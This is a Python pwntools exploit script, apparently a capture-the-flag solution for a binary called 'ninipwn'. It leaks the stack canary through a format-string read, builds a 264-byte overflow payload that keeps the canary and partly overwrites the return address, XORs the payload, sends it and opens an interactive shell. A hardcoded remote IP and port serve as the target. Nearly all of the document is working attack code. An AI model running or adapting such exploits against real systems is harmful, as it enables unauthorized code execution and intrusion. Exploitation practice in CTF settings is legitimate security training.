#!/usr/bin/python3

from pwn import *

exe = ELF('ninipwn', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000555555555431
                b*0x000055555555539d
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('3.75.185.198', 7000)
else:
        p = process(exe.path)

GDB()
format = b'%39$p|'.ljust(8, p8(0)) + p16(282)
sla(b'h: ', '10')
sa(b'y: ', format)
p.recvuntil(b': ')
canary = int(p.recvuntil(b'|', drop=True), 16)
info("canary: " + hex(canary))
payload = b'a'*264
payload += flat(
        canary, 0
) + p16(0x5433)
payload = xor(payload, format[0:8])
sa(b'Text: ', payload)
p.interactive()
